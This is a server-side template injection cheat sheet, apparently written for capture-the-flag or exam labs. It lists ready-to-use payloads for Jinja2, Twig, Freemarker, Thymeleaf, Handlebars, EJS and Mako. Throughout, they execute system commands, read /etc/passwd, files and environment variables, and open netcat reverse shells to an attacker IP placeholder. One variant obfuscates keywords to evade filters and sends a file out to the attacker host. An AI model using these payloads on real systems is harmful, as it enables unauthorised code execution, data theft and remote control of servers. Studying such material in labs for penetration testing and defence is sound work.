# **Server-Side Template Injection (SSTI)**

#### **When to Test SSTI**
- When you see user input reflected in templates or rendered output.
- When the application uses templating engines known to be vulnerable.
- When you have access to template editing features.
- When error messages or output suggest template syntax is being processed.

#### **Common tags to test for SSTI **
```
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
${{7*7}}
```

#### **Payloads**
- **Jinja2 (Python)**
```
{{7*7}}

{{ config|pprint }}

{{''.__class__.__mro__[2].__subclasses__()[40]('id',shell=True,stdout=-1).communicate()[0].decode()}}
```
---
- **Twig (PHP)**
```
{{7*7}}

{{ system('id') }}

{{ include('/etc/passwd') }}

{{[0]|reduce('system', 'cat /var/www/flag.txt')}}

{{[0]|reduce('system', 'which python3  which python  which perl  which nc  which busybox || which bash')}} 
```
**Reverse Shell**
```
{{[0]|reduce('system','nc <Kali_IP> 443 -e /bin/bash')}}
```
---
- **Freemarker (Java)**
```
${7*7}

${"freemarker.template.utility.Execute"?new()("id")}

${"freemarker.template.utility.Execute"?new()("cat /root/flag.txt")}
```
---
- **Thymeleaf (Java)**
```
${7*7}

${T(java.lang.Runtime).getRuntime().exec('id')}

${T(java.lang.Runtime).getRuntime().exec('cat /root/flag.txt')}

${T(java.lang.System).getenv()}

${T(java.lang.System).getProperty('user.dir')}
```
---
- Mustache and Handlebars (JavaScript)
```
{{#with "7*7"}}{{this}}{{/with}}
```
```
{{#each (readdir "/")}}
{{this}}
{{/each}}

{{#each (readdir "/secret")}}
{{this}}
{{/each}}


{{read "/secret/flag.txt"}}
```
---

- **EJS (Embedded JavaScript)** 
```
<%= 3*3 %>

<%= process.mainModule.require("child_process").execSync("id").toString() %>
```

**Reverse Shell**
- If keywords such as process, require and exec are getting filtered:
```
nc -nlvp 443

<%= proprocesscess.mainModule.requrequireire('child_procprocessess').exexecec("cat /root/proof.txt | nc <Kali_IP> 443").toString() %>?
```

---
- **Mako**
```
${self.module.cache.util.os.system("id")}

${self.module.cache.util.os.popen("id").read()}

${self.module.cache.util.os.popen("ls").read()}

${self.module.cache.util.os.popen("cat proof.txt").read()}
```
**Reverse Shell**
- To see which binaries are available
```
${self.module.cache.util.os.popen('which python3  which python  which perl  which nc  which busybox || which sh').read()}
```

- Try reverse shell for netcat
```
${self.module.cache.util.os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <Kali_IP> 443 >/tmp/f")}
```
---